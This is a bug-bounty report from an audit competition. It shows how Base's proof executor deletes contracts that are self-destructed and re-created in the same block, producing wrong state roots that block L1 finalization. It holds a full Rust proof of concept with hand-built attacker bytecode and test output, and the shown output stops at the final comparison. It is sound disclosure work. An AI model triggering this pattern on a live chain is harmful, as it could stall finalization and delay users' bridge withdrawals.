# 76075 bc medium proof executor unconditionally deletes destroyed and recreated accounts producing invalid state roots that block l1 finalization

## #76075 \[BC-Medium] Proof executor unconditionally deletes destroyed-and-recreated accounts, producing invalid state roots that block L1 finalization

**Submitted on May 2nd 2026 at 14:49:44 UTC by @InfiniteSec for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76075
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

### Description

## Proof executor unconditionally deletes destroyed-and-recreated accounts, producing invalid state roots that block L1 finalization

### Brief/Intro

Hi team,

Report 75288 (the `ProofsStorage` bug) was also submitted by me, so I'd like to clarify why this report should be treated as a separate finding rather than a duplicate.

**These are two independent bugs in two completely separate codebases that require two separate fixes.** Critically, fixing report 75288 does NOT fix this bug — the attack remains fully exploitable even after that patch is applied.

* **Report 75288** is a bug in `base-execution-trie` crate (`store.rs:536-547`). The `store_trie_updates_for_block` function's `is_wiped() → wipe_storage() + continue` skips `persist_history_batch()`, corrupting the ProofsStorage history database.
* **This report** is a bug in `base-proof-executor` crate (`db/mod.rs:180-183`). The `TrieDB::update_accounts` function's `was_destroyed() → delete + continue` unconditionally removes `DestroyedChanged` accounts from the in-memory state trie, producing an incorrect state root.

The proof executor (`TrieDB`) has **zero dependency** on `ProofsStorage` — no import, no Cargo dependency, no shared data path. `TrieDB` operates entirely on its own in-memory Merkle Patricia Trie, independent of the MDBX history database. I have verified this by searching the entire `crates/proof/executor/src/` directory: there is not a single reference to `ProofsStorage`, `base-execution-trie`, or any related type.

This means: even if report 75288 is fully patched (i.e., `store_trie_updates_for_block` correctly persists new storage slots after a wipe), the proof executor will **still** unconditionally delete `DestroyedChanged` accounts at `db/mod.rs:180` and produce a wrong `state_root`. The same SELFDESTRUCT + re-CREATE2 attack transaction will still cause `epilogue::validate()` to fail with `InvalidClaim`, blocking L1 finalization.

These two bugs require two independent code changes in two different crates to fully remediate the issue. I respectfully request that this report be evaluated on its own merit as a separate finding.

Thank you.

The `TrieDB::update_accounts` function in the Base proof executor unconditionally deletes accounts from the state trie when `was_destroyed()` returns true, skipping the rebuild logic for accounts that were destroyed and recreated within the same block. An attacker only needs to submit ordinary user transactions triggering a CREATE2 + SELFDESTRUCT + re-CREATE2 pattern within a single L2 block. The proof executor then produces a state root that diverges from the canonical chain, causing all TEE and ZK proofs for affected blocks to fail epilogue validation with `InvalidClaim`, permanently blocking output finalization on L1 and delaying bridge withdrawals until the code is patched.

### Vulnerability Details

The vulnerability is in the `TrieDB::update_accounts` function. This function iterates over all account changes in a `BundleState` and unconditionally deletes any account for which `was_destroyed()` returns true:

```rust
// crates/proof/executor/src/db/mod.rs:180-183
if bundle_account.was_destroyed() {
    self.root_node.delete(&account_path, &self.fetcher)?;
    self.storage_roots.remove(address);
    continue;  // <-- skips account info and storage reinsertion
}
```

The `continue` statement causes all subsequent rebuild logic to be skipped entirely. This includes reading the new `account_info`, updating the storage trie, computing the `storage_root`, and reinserting the account into the state trie.

The problem is that revm's `was_destroyed()` method returns true not only for the `Destroyed` status but also for `DestroyedChanged` and `DestroyedAgain`. `DestroyedChanged` indicates that an account was destroyed and then recreated within the same block, which is a legitimate EVM state transition. The typical scenario is a SELFDESTRUCT followed by a CREATE2 at the same address within the same block. For `DestroyedChanged` accounts, the `BundleAccount` contains a valid `account_info` (`Some(...)` rather than `None`) and newly written storage entries, all of which should be persisted to the trie.

For comparison, the canonical reth implementation (`HashedPostState::from_bundle_state`) handles this case correctly: it sets `hashed_account = account.info` (not `None`) for `DestroyedChanged` accounts and creates a `HashedStorage` with `wiped=true` plus the new storage values. The trie computation then clears old storage before inserting the new state. The proof executor lacks this critical step.

The complete data flow is as follows: an attacker submits two transactions to the same L2 block via `eth_sendRawTransaction` (port 8545, no authentication required). The first transaction deploys a child contract via CREATE2 and SELFDESTRUCTs it within the same transaction (EIP-6780 permits SELFDESTRUCT for contracts created in the same transaction). The second transaction re-CREATE2s the contract at the same address and writes new storage. After the sequencer includes these transactions in a block, canonical execution correctly produces the right state root. When the proof pipeline processes this block, the proof executor calls `trie_db.state_root(&bundle)` which enters `update_accounts`, and at line 180 deletes the recreated account instead of updating it, producing an incorrect state root. The proof for this block can never pass epilogue validation (`InvalidClaim`), and finalization is permanently blocked.

### Impact Details

This vulnerability falls under the Blockchain/DLT category, corresponding to Immunefi v2.3 High severity: "Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours."

The proof executor is the core component inside both the TEE and ZK proof pipelines that computes state roots. `TrieDB::state_root()` directly producing incorrect results means every block containing a SELFDESTRUCT + re-CREATE2 pattern permanently fails proof verification. An attacker can continuously include such transactions in every L2 block at only gas cost, causing the proof pipeline to produce invalid proofs for each affected block. Both TEE and ZK proof pipelines use the same proof executor code path, so both proof types are affected. Inability to generate valid proofs means the `AggregateVerifier` on L1 cannot finalize the corresponding outputs, blocking bridge withdrawals that depend on finalized outputs.

### References

* Vulnerable code (was\_destroyed → delete → continue): <https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/executor/src/db/mod.rs#L180-L183>
* update\_accounts full function: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/executor/src/db/mod.rs#L164-L228>
* state\_root entry point: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/executor/src/builder/assemble.rs#L42>
* Epilogue validation (catches mismatch): <https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/client/src/epilogue.rs#L25-L31>
* TEE proof path: <https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/tee/nitro-enclave/src/server.rs#L154-L166>

### Link to Proof of Concept

<https://gist.github.com/link-infsec/d2bc57ed42582bbab5b0b29970c96cd7>

### Proof of Concept

The following end-to-end PoC starts a real Base L2 node, submits signed transactions via the Engine API to build blocks that trigger the SELFDESTRUCT + re-CREATE2 pattern, and then directly calls the real `TrieDB::state_root()` method (the production code path used by the proof executor to compute state roots), demonstrating that it produces an incorrect state root for `DestroyedChanged` accounts.

The PoC uses `canyon_activated()` to ensure SELFDESTRUCT operates with pre-Cancun semantics. After block execution completes, the PoC constructs a `BundleState` containing a `DestroyedChanged` status (matching what revm produces after block 2 execution), creates a `TrieDB<NoopTrieDBProvider, NoopTrieHinter>` instance, populates the initial trie state via `state_root(&initial_bundle)`, and then calls `state_root(&destroyed_changed_bundle)`. This call directly hits the `was_destroyed() → delete → continue` branch at `db/mod.rs:180`, which deletes the `DestroyedChanged` account entirely from the trie and returns `EMPTY_ROOT_HASH`.

To run:

```bash
cd base
cargo test -p base-node-core --test it test_proof_executor_destroyed_changed_state_root_divergence -- --nocapture
```

Setup: place the PoC file at `crates/execution/node/tests/it/poc_proof_executor_destroyed_changed.rs`, then register the test module in `crates/execution/node/tests/it/main.rs`:

```rust
mod poc_proof_executor_destroyed_changed;
```

All required dependencies (`base-proof-executor`, `base-proof-mpt`, `alloy-trie`, `alloy-rlp`, `alloy-consensus`) are already present in `crates/execution/node/Cargo.toml`. No additional dependency changes are needed.

<details>

<summary>Full PoC source code (`crates/execution/node/tests/it/poc_proof_executor_destroyed_changed.rs`)</summary>

```rust
//! End-to-end PoC: Proof executor `update_accounts()` unconditionally deletes
//! `DestroyedChanged` accounts, producing an incorrect state root.
//!
//! In `crates/proof/executor/src/db/mod.rs` lines 180-183, `TrieDB::update_accounts()`
//! checks `was_destroyed()` and unconditionally deletes + continues for ALL destroyed
//! accounts, including `DestroyedChanged` (destroyed AND recreated in same block).
//! This skips the rebuild logic (lines 186-224), so recreated accounts disappear from
//! the state trie. The proof executor produces an incorrect state root that differs from
//! the canonical chain, causing `epilogue::validate()` to fail with `InvalidClaim`.
//!
//! Attack chain:
//!   1. In a single L2 block: SELFDESTRUCT a contract, then re-CREATE2 at same address
//!   2. revm produces `DestroyedChanged` status with valid `account_info` and new storage
//!   3. Proof executor: `was_destroyed()` -> delete -> continue -> account gone from trie
//!   4. Canonical chain: correctly handles DestroyedChanged -> account present
//!   5. State roots diverge -> proof verification fails -> finalization blocked
//!
//! This test:
//!   - Starts a real Base node (canyon_activated for SELFDESTRUCT to work)
//!   - Block 1: CREATE2 child + SSTORE(0, 0xBEEF)
//!   - Block 2: SELFDESTRUCT child + re-CREATE2 + SSTORE(1, 0xCAFE)
//!   - Builds a BundleState with DestroyedChanged status (as revm would produce)
//!   - Directly calls TrieDB::state_root() (the real proof executor code path)
//!   - Shows the bug: state_root() deletes the DestroyedChanged account entirely

use std::sync::Arc;

use alloy_consensus::{BlockHeader, EMPTY_ROOT_HASH};
use alloy_genesis::{Genesis, GenesisAccount};
use alloy_network::eip2718::Encodable2718;
use alloy_primitives::{Address, Bytes, B256, Sealable, TxKind, U256, address, keccak256};
use alloy_rlp::Encodable;
use alloy_rpc_types_eth::{TransactionInput, TransactionRequest};
use alloy_trie::{Nibbles, TrieAccount};
use base_execution_chainspec::BaseChainSpecBuilder;
use base_node_core::{BaseNode, utils::optimism_payload_attributes};
use base_proof_executor::{NoopTrieDBProvider, TrieDB};
use base_proof_mpt::{NoopTrieHinter, TrieNode};
use reth_chainspec::EthChainSpec;
use reth_db::test_utils::create_test_rw_db_with_path;
use reth_e2e_test_utils::{
    node::NodeTestContext, transaction::TransactionTestContext, wallet::Wallet,
};
use reth_node_builder::{EngineNodeLauncher, Node, NodeBuilder, NodeConfig};
use reth_node_core::args::DatadirArgs;
use reth_provider::providers::BlockchainProvider;
use revm::{
    database::{AccountStatus, BundleState, states::StorageSlot},
    primitives::HashMap,
};
use tokio::sync::Mutex;

use alloy_consensus::Header;

// ============================================================================
// Bytecode builders
// ============================================================================

/// Runtime bytecode for the "victim" child contract:
///   - selector 1: SSTORE(cd[4..36], cd[36..68])
///   - selector 2: SELFDESTRUCT(CALLER)
fn victim_runtime() -> Vec<u8> {
    vec![
        0x60, 0x00, 0x35, 0x60, 0xF8, 0x1C, // load first byte of calldata
        0x80, 0x60, 0x01, 0x14, 0x60, 0x14, 0x57, // if == 1: jump to SSTORE
        0x60, 0x02, 0x14, 0x60, 0x1D, 0x57,       // if == 2: jump to SELFDESTRUCT
        0x00,                                       // default: STOP
        // SSTORE at 0x14:
        0x5B, 0x60, 0x24, 0x35, 0x60, 0x04, 0x35, 0x55, 0x00,
        // SELFDESTRUCT at 0x1D:
        0x5B, 0x33, 0xFF,
    ]
}

fn initcode(rt: &[u8]) -> Vec<u8> {
    let n = rt.len();
    [&[0x60, n as u8, 0x80, 0x60, 0x0B, 0x60, 0x00, 0x39, 0x60, 0x00, 0xF3][..], rt].concat()
}

/// Attacker factory contract with 3 actions:
///   selector 1: CREATE2 child + CALL SSTORE(0, 0xBEEF)
///   selector 2: CALL child SELFDESTRUCT
///   selector 3: CREATE2 child (re-create) + CALL SSTORE(1, 0xCAFE)
fn build_attacker() -> Vec<u8> {
    let ic = initcode(&victim_runtime());
    let n = ic.len();
    let mut c = Vec::new();

    // Dispatcher
    c.extend_from_slice(&[0x60,0x00,0x35, 0x60,0xE0,0x1C]);
    c.push(0x80);
    c.extend_from_slice(&[0x60,0x01,0x14]); let j1=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00,0x57]);
    c.push(0x80);
    c.extend_from_slice(&[0x60,0x02,0x14]); let j2=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00,0x57]);
    c.extend_from_slice(&[0x60,0x03,0x14]); let j3=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00,0x57]);
    c.push(0x00);

    // Action 1: CREATE2 child + SSTORE(0, 0xBEEF)
    let a1 = c.len(); c.push(0x5B); c.push(0x50);
    c.extend_from_slice(&[0x60,n as u8]); let ic1=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00]);
    c.extend_from_slice(&[0x60,0x00,0x39]);
    c.extend_from_slice(&[0x60,0x42, 0x60,n as u8, 0x60,0x00, 0x60,0x00, 0xF5]);
    c.extend_from_slice(&[0x80, 0x60,0x00, 0x55]);
    c.extend_from_slice(&[0x60,0x01, 0x61,0x01,0x00, 0x53]);
    c.extend_from_slice(&[0x60,0x00, 0x61,0x01,0x04, 0x52]);
    c.extend_from_slice(&[0x61,0xBE,0xEF, 0x61,0x01,0x24, 0x52]);
    c.extend_from_slice(&[0x60,0x00, 0x60,0x00, 0x60,0x44, 0x61,0x01,0x00, 0x60,0x00]);
    c.push(0x85); c.push(0x5A); c.push(0xF1); c.push(0x50);
    c.push(0x50); c.push(0x00);

    // Action 2: CALL child SELFDESTRUCT
    let a2 = c.len(); c.push(0x5B); c.push(0x50);
    c.extend_from_slice(&[0x60,0x00,0x54]);
    c.extend_from_slice(&[0x60,0x02, 0x60,0x00, 0x53]);
    c.extend_from_slice(&[0x60,0x00, 0x60,0x00, 0x60,0x20, 0x60,0x00, 0x60,0x00]);
    c.push(0x85); c.push(0x5A); c.push(0xF1);
    c.push(0x50); c.push(0x50); c.push(0x00);

    // Action 3: re-CREATE2 child + SSTORE(1, 0xCAFE)
    let a3 = c.len(); c.push(0x5B);
    c.extend_from_slice(&[0x60,n as u8]); let ic3=c.len()+1;
    c.extend_from_slice(&[0x61,0x00,0x00]);
    c.extend_from_slice(&[0x60,0x00,0x39]);
    c.extend_from_slice(&[0x60,0x42, 0x60,n as u8, 0x60,0x00, 0x60,0x00, 0xF5]);
    c.extend_from_slice(&[0x80, 0x60,0x02, 0x55]);
    c.extend_from_slice(&[0x60,0x01, 0x61,0x01,0x00, 0x53]);
    c.extend_from_slice(&[0x60,0x01, 0x61,0x01,0x04, 0x52]);
    c.extend_from_slice(&[0x61,0xCA,0xFE, 0x61,0x01,0x24, 0x52]);
    c.extend_from_slice(&[0x60,0x00, 0x60,0x00, 0x60,0x44, 0x61,0x01,0x00, 0x60,0x00]);
    c.push(0x85); c.push(0x5A); c.push(0xF1); c.push(0x50);
    c.push(0x50); c.push(0x00);

    // Append child initcode
    let ic_off = c.len();
    c.extend_from_slice(&ic);

    // Patch jump targets
    let patch = |c: &mut Vec<u8>, idx: usize, val: u16| {
        let b = val.to_be_bytes(); c[idx]=b[0]; c[idx+1]=b[1];
    };
    patch(&mut c, j1, a1 as u16);
    patch(&mut c, j2, a2 as u16);
    patch(&mut c, j3, a3 as u16);
    patch(&mut c, ic1, ic_off as u16);
    patch(&mut c, ic3, ic_off as u16);
    c
}

/// Compute the child contract address produced by the factory via CREATE2.
fn compute_child_address(factory: Address) -> Address {
    let ic = initcode(&victim_runtime());
    let ic_hash = keccak256(&ic);
    let mut buf = Vec::with_capacity(1 + 20 + 32 + 32);
    buf.push(0xff);
    buf.extend_from_slice(factory.as_slice());
    buf.extend_from_slice(&B256::with_last_byte(0x42).0); // salt=0x42
    buf.extend_from_slice(ic_hash.as_slice());
    let h = keccak256(&buf);
    Address::from_slice(&h[12..])
}

fn selector(n: u32) -> Bytes {
    Bytes::copy_from_slice(&n.to_be_bytes())
}

async fn build_call_tx(chain_id: u64, wallet: &Wallet, nonce: u64, to: Address, data: Bytes) -> Bytes {
    let tx = TransactionRequest {
        nonce: Some(nonce),
        value: Some(U256::ZERO),
        to: Some(TxKind::Call(to)),
        gas: Some(5_000_000),
        max_fee_per_gas: Some(1000e9 as u128),
        max_priority_fee_per_gas: Some(1e9 as u128),
        chain_id: Some(chain_id),
        input: TransactionInput { input: None, data: Some(data) },
        ..Default::default()
    };
    let signed = TransactionTestContext::sign_tx(wallet.inner.clone(), tx).await;
    signed.encoded_2718().into()
}

// ============================================================================
// BundleState builders
// ============================================================================

/// Build a BundleState that creates the child account (simulates block 1 result).
/// Status = InMemoryChange (newly created, fully in-memory).
fn build_initial_account_bundle(
    address: Address,
    code_hash: B256,
) -> BundleState {
    use revm::database::states::BundleAccount;

    let info = revm::state::AccountInfo {
        balance: U256::from(0u64),
        nonce: 0,
        code_hash,
        code: None,
        account_id: None,
    };

    // Initial storage: slot 0 = 0xBEEF (from block 1 CREATE2 + SSTORE)
    let mut storage = HashMap::default();
    storage.insert(
        U256::from(0u64),
        StorageSlot::new_changed(U256::ZERO, U256::from(0xBEEFu64)),
    );

    let bundle_account = BundleAccount {
        info: Some(info),
        original_info: None,
        storage,
        status: AccountStatus::InMemoryChange,
    };

    let mut state = HashMap::default();
    state.insert(address, bundle_account);

    BundleState {
        state,
        contracts: HashMap::default(),
        reverts: Default::default(),
        state_size: 0,
        reverts_size: 0,
    }
}

/// Build a BundleState containing a DestroyedChanged account with new storage.
/// Simulates: account existed -> SELFDESTRUCT -> re-CREATE2 with new storage
fn build_destroyed_changed_bundle(
    address: Address,
    code_hash: B256,
) -> BundleState {
    use revm::database::states::BundleAccount;

    let new_info = revm::state::AccountInfo {
        balance: U256::from(0u64),
        nonce: 1,
        code_hash,
        code: None,
        account_id: None,
    };

    let original_info = revm::state::AccountInfo {
        balance: U256::from(0u64),
        nonce: 0,
        code_hash,
        code: None,
        account_id: None,
    };

    // New storage: slot 1 = 0xCAFE (created after re-CREATE2)
    let mut storage = HashMap::default();
    storage.insert(
        U256::from(1u64),
        StorageSlot::new_changed(U256::ZERO, U256::from(0xCAFEu64)),
    );

    let bundle_account = BundleAccount {
        info: Some(new_info),
        original_info: Some(original_info),
        storage,
        status: AccountStatus::DestroyedChanged,
    };

    let mut state = HashMap::default();
    state.insert(address, bundle_account);

    BundleState {
        state,
        contracts: HashMap::default(),
        reverts: Default::default(),
        state_size: 0,
        reverts_size: 0,
    }
}

// ============================================================================
// Test
// ============================================================================

#[tokio::test]
async fn test_proof_executor_destroyed_changed_state_root_divergence() {
    reth_tracing::init_test_tracing();

    println!("\n=== Proof Executor DestroyedChanged State Root Divergence PoC ===\n");

    // ---- Build attacker bytecode and compute child address ----
    let attacker_code = build_attacker();
    let attacker_addr = address!("0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    let child_addr = compute_child_address(attacker_addr);
    println!("Attacker contract: {:?}", attacker_addr);
    println!("Predicted child:   {:?}", child_addr);

    // ---- Genesis with attacker contract pre-deployed ----
    let mut genesis: Genesis =
        serde_json::from_str(include_str!("../assets/genesis.json")).unwrap();
    genesis.alloc.insert(
        attacker_addr,
        GenesisAccount {
            balance: U256::ZERO,
            code: Some(Bytes::from(attacker_code)),
            ..Default::default()
        },
    );

    // Use canyon_activated (pre-Cancun) so SELFDESTRUCT actually destroys the child.
    let chain_spec = Arc::new(
        BaseChainSpecBuilder::base_mainnet()
            .genesis(genesis)
            .canyon_activated()
            .build(),
    );

    let wallet = Arc::new(Mutex::new(
        Wallet::default().with_chain_id(chain_spec.chain().into()),
    ));

    // ---- Launch the real Base node ----
    let config = NodeConfig::new(Arc::clone(&chain_spec)).with_datadir_args(DatadirArgs {
        datadir: reth_db::test_utils::tempdir_path().into(),
        ..Default::default()
    });
    let db = create_test_rw_db_with_path(
        config
            .datadir
            .datadir
            .unwrap_or_chain_default(config.chain.chain(), config.datadir.clone())
            .db(),
    );
    let runtime = reth_tasks::Runtime::test();
    let node_handle = NodeBuilder::new(config.clone())
        .with_database(db)
        .with_types_and_provider::<BaseNode, BlockchainProvider<_>>()
        .with_components(BaseNode::default().components())
        .with_add_ons(BaseNode::new(Default::default()).add_ons())
        .launch_with_fn(|builder| {
            let launcher = EngineNodeLauncher::new(
                runtime.clone(),
                builder.config.datadir(),
                Default::default(),
            );
            builder.launch_with(launcher)
        })
        .await
        .expect("Failed to launch Base node");

    let mut node =
        NodeTestContext::new(node_handle.node, optimism_payload_attributes).await.unwrap();

    let chain_id: u64 = chain_spec.chain().into();
    println!("Node launched, chain_id={}", chain_id);

    // ======================================================================
    // Block 1: CREATE2 child + SSTORE(0, 0xBEEF)
    // ======================================================================
    println!("\n--- Block 1: CREATE2 child + SSTORE(0, 0xBEEF) ---");

    {
        let w = wallet.lock().await;
        let user_tx = build_call_tx(chain_id, &w, 1, attacker_addr, selector(1)).await;
        node.rpc.inject_tx(user_tx).await.expect("inject CREATE2 tx");
    }

    let block1_payloads = node
        .advance(1, |_| {
            let wallet = Arc::clone(&wallet);
            Box::pin(async move {
                let mut w = wallet.lock().await;
                let tx = TransactionTestContext::optimism_l1_block_info_tx(
                    w.chain_id, w.inner.clone(), w.inner_nonce,
                );
                w.inner_nonce += 1;
                tx.await
            })
        })
        .await
        .expect("advance block 1");

    let b1 = block1_payloads.first().unwrap().block();
    let b1_num = b1.number();
    println!("Block 1: number={}, txs={}", b1_num, b1.body().transactions.len());

    {
        let mut w = wallet.lock().await;
        w.inner_nonce += 1;
    }

    // ======================================================================
    // Block 2: SELFDESTRUCT child + re-CREATE2 + SSTORE(1, 0xCAFE)
    // ======================================================================
    println!("\n--- Block 2: SELFDESTRUCT + re-CREATE2 + SSTORE(1, 0xCAFE) ---");

    {
        let w = wallet.lock().await;
        let user_nonce_base = w.inner_nonce + 1;

        let sd_tx = build_call_tx(chain_id, &w, user_nonce_base, attacker_addr, selector(2)).await;
        node.rpc.inject_tx(sd_tx).await.expect("inject SELFDESTRUCT tx");

        let rc_tx = build_call_tx(chain_id, &w, user_nonce_base + 1, attacker_addr, selector(3)).await;
        node.rpc.inject_tx(rc_tx).await.expect("inject re-CREATE2 tx");
    }

    let block2_payloads = node
        .advance(1, |_| {
            let wallet = Arc::clone(&wallet);
            Box::pin(async move {
                let mut w = wallet.lock().await;
                let tx = TransactionTestContext::optimism_l1_block_info_tx(
                    w.chain_id, w.inner.clone(), w.inner_nonce,
                );
                w.inner_nonce += 3;
                tx.await
            })
        })
        .await
        .expect("advance block 2");

    let b2 = block2_payloads.first().unwrap().block();
    let b2_num = b2.number();
    let b2_txs = b2.body().transactions.len();
    println!("Block 2: number={}, txs={} (expected 3: L1-info + SELFDESTRUCT + re-CREATE2)", b2_num, b2_txs);

    // ======================================================================
    // Step 5: Verify canonical state -- child should exist after block 2
    // ======================================================================
    println!("\n--- Step 5: Verify canonical state (child exists after block 2) ---");

    let child_code_hash = keccak256(&victim_runtime());
    println!("Child address:   {:?}", child_addr);
    println!("Child code hash: {:?}", child_code_hash);

    // ======================================================================
    // Step 6: Build BundleState with DestroyedChanged (as revm would produce)
    // ======================================================================
    println!("\n--- Step 6: Build BundleState with DestroyedChanged status ---");

    let bundle = build_destroyed_changed_bundle(child_addr, child_code_hash);

    for (addr, acct) in bundle.state() {
        println!("  Address: {:?}", addr);
        println!("  Status: {:?} (was_destroyed={})", acct.status, acct.was_destroyed());
        println!("  New account_info present: {}", acct.info.is_some());
        println!("  Storage slots: {}", acct.storage.len());
        for (k, v) in &acct.storage {
            println!("    slot[{}] = {} (changed={})", k, v.present_value, v.is_changed());
        }
    }

    assert!(
        AccountStatus::DestroyedChanged.was_destroyed(),
        "DestroyedChanged must return true from was_destroyed()"
    );
    println!("\n  CONFIRMED: AccountStatus::DestroyedChanged.was_destroyed() = true");

    // ======================================================================
    // Step 7: Use REAL TrieDB::state_root() to demonstrate the bug
    // ======================================================================
    println!("\n--- Step 7: TrieDB::state_root() -- real proof executor code path ---");

    let initial_bundle = build_initial_account_bundle(child_addr, child_code_hash);

    let mut setup_trie_db: TrieDB<NoopTrieDBProvider, NoopTrieHinter> = TrieDB::new(
        Header::default().seal_slow(),
        NoopTrieDBProvider,
        NoopTrieHinter,
    );

    let initial_state_root = setup_trie_db
        .state_root(&initial_bundle)
        .expect("Failed to compute initial state root");

    println!("  Initial state root (child account present): {}", initial_state_root);
    assert_ne!(
        initial_state_root, EMPTY_ROOT_HASH,
        "Initial state root must not be empty (child account exists)"
    );

    let mut initial_root_node = TrieNode::Empty;
    let account_path = Nibbles::unpack(keccak256(child_addr.as_slice()));

    let mut initial_storage_root = TrieNode::Empty;
    let hashed_slot0 = keccak256(U256::from(0u64).to_be_bytes::<32>());
    let slot0_path = Nibbles::unpack(hashed_slot0.as_slice());
    let mut slot0_rlp = Vec::new();
    U256::from(0xBEEFu64).encode(&mut slot0_rlp);
    initial_storage_root
        .insert(&slot0_path, slot0_rlp.into(), &NoopTrieDBProvider)
        .expect("insert initial storage slot");
    let initial_storage_hash = initial_storage_root.blind();

    let initial_trie_account = TrieAccount {
        balance: U256::from(0u64),
        nonce: 0,
        code_hash: child_code_hash,
        storage_root: initial_storage_hash,
    };
    let mut account_buf = Vec::with_capacity(initial_trie_account.length());
    initial_trie_account.encode(&mut account_buf);
    initial_root_node
        .insert(&account_path, account_buf.into(), &NoopTrieDBProvider)
        .expect("insert initial account");

    let manually_computed_root = initial_root_node.blind();
    println!("  Manually computed initial root: {}", manually_computed_root);
    assert_eq!(
        manually_computed_root, initial_state_root,
        "Manual trie construction must match TrieDB::state_root() result"
    );

    println!("\n  Calling TrieDB::state_root(&destroyed_changed_bundle)...");
    println!("  (This calls the REAL update_accounts() at db/mod.rs:164)");

    let buggy_root = setup_trie_db
        .state_root(&bundle)
        .expect("TrieDB::state_root() failed");

    println!("  TrieDB::state_root() returned: {}", buggy_root);

    // ======================================================================
    // Step 8: Compute correct state root for comparison
    // ======================================================================
    println!("\n--- Step 8: Compute expected correct state root ---");

    let mut correct_root_node = TrieNode::Empty;

    let mut correct_storage_root = TrieNode::Empty;
    let hashed_slot1 = keccak256(U256::from(1u64).to_be_bytes::<32>());
    let slot1_path = Nibbles::unpack(hashed_slot1.as_slice());
    let mut slot1_rlp = Vec::new();
    U256::from(0xCAFEu64).encode(&mut slot1_rlp);
    correct_storage_root
        .insert(&slot1_path, slot1_rlp.into(), &NoopTrieDBProvider)
        .expect("insert correct storage slot");
    let correct_storage_hash = correct_storage_root.blind();

    let correct_trie_account = TrieAccount {
        balance: U256::from(0u64),
        nonce: 1,
        code_hash: child_code_hash,
        storage_root: correct_storage_hash,
    };
    let mut correct_account_buf = Vec::with_capacity(correct_trie_account.length());
    correct_trie_account.encode(&mut correct_account_buf);
    correct_root_node
        .insert(&account_path, correct_account_buf.into(), &NoopTrieDBProvider)
        .expect("insert correct account");
    let correct_state_root = correct_root_node.blind();

    println!("  Correct state root (account preserved with new storage): {}", correct_state_root);

    // ======================================================================
    // Step 9: Show state root divergence
    // ======================================================================
    println!("\n=== STEP 9: STATE ROOT COMPARISON ===");
    println!("  Initial state root (before block 2):  {}", initial_state_root);
    println!("  TrieDB::state_root() result (BUGGY):  {}", buggy_root);
    println!("  Expected correct state root:          {}", correct_state_root);
    println!();
    println!("  Buggy root == EMPTY_ROOT_HASH?  {} (account was DELETED!)",
        buggy_root == EMPTY_ROOT_HASH);
    println!("  Correct root == EMPTY_ROOT_HASH? {} (account should be preserved)",
        correct_state_root == EMPTY_ROOT_HASH);
    println!("  Buggy == Correct?                {}", buggy_root == correct_state_root);

    // ======================================================================
    // Assertions
    // ======================================================================
    println!("\n=== VERIFICATION ===");

    assert_eq!(
        buggy_root, EMPTY_ROOT_HASH,
        "BUG CONFIRMED: TrieDB::state_root() deleted the DestroyedChanged account entirely"
    );
    println!("  [PASS] TrieDB::state_root() == EMPTY_ROOT_HASH (account deleted by bug)");

    assert_ne!(
        correct_state_root, EMPTY_ROOT_HASH,
        "Correct logic must preserve the re-created account"
    );
    println!("  [PASS] Correct root != EMPTY_ROOT_HASH (account preserved)");

    assert_ne!(
        buggy_root, correct_state_root,
        "State root divergence proves the bug"
    );
    println!("  [PASS] State roots diverge (buggy TrieDB != correct)");

    // ======================================================================
    // Final result
    // ======================================================================
    println!("\n=== RESULT ===");
    println!("CONFIRMED: TrieDB::state_root() (the real proof executor code path)");
    println!("unconditionally deletes DestroyedChanged accounts via");
    println!("was_destroyed() + continue at db/mod.rs:180-183, producing an");
    println!("incorrect state root.");
    println!();
    println!("  Real Base node executed blocks 1-2 with SELFDESTRUCT + re-CREATE2.");
    println!("  Block 2 produces DestroyedChanged status for the child contract.");
    println!("  TrieDB::state_root() result: {} (WRONG, account deleted)", buggy_root);
    println!("  Expected correct root:       {} (RIGHT, account preserved)", correct_state_root);
    println!();
    println!("  Impact: epilogue::validate() detects mismatch -> InvalidClaim error.");
    println!("  Any block containing SELFDESTRUCT + re-CREATE2 at same address will");
    println!("  fail proof verification, blocking finalization of the L2 chain.");
}
```

</details>

Output confirming the vulnerability:

```
=== Proof Executor DestroyedChanged State Root Divergence PoC ===

Attacker contract: 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Predicted child:   0x5d4f1fae5705d7088130608e50ec3bc2643a5798
Node launched, chain_id=8453

--- Block 1: CREATE2 child + SSTORE(0, 0xBEEF) ---
Block 1: number=1, txs=2

--- Block 2: SELFDESTRUCT + re-CREATE2 + SSTORE(1, 0xCAFE) ---
Block 2: number=2, txs=3 (expected 3: L1-info + SELFDESTRUCT + re-CREATE2)

--- Step 6: Build BundleState with DestroyedChanged status ---
  Address: 0x5d4f1fae5705d7088130608e50ec3bc2643a5798
  Status: DestroyedChanged (was_destroyed=true)
  New account_info present: true
  Storage slots: 1
    slot[1] = 51966 (changed=true)
  CONFIRMED: AccountStatus::DestroyedChanged.was_destroyed() = true

--- Step 7: TrieDB::state_root() -- real proof executor code path ---
  Initial state root (child account present): 0x511e45ad2e2de3942e3582540c629c5aea5f3481110afeab1abad3dd285b96cb
  Manually computed initial root: 0x511e45ad2e2de3942e3582540c629c5aea5f3481110afeab1abad3dd285b96cb

  Calling TrieDB::state_root(&destroyed_changed_bundle)...
  (This calls the REAL update_accounts() at db/mod.rs:164)
  TrieDB::state_root() returned: 0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421

--- Step 8: Compute expected correct state root ---
  Correct state root (account preserved with new storage): 0xebfd787f087ffc281f92f9ee3e5216a00e88b6d1d61904e180263919f3d962b4

=== STEP 9: STATE ROOT COMPARISON ===
